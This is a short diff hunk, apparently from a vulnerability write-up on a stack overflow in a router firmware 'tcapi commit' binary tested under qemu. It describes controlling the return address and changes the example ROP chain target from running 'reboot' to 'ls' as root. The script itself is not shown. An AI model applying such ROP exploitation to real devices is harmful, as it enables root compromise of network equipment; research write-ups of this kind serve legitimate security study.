@@ -30,7 +30,7 @@ $ sudo chroot . ./qemu userfs/bin/tcapi commit Aa0Aa1Aa2Aa3Aa4Aa
 ```
 
 We have a full control over the return address along with a few other registers.
-Full ROP chain used to execute 'system("reboot");' as root user can be crafted as follows: (ASLR has been disabled for testing purposes.)
+Full ROP chain used to execute 'system("ls");' as root user can be crafted as follows: (ASLR has been disabled for testing purposes.)
 ```
 #!/usr/bin/envpython
 import sys
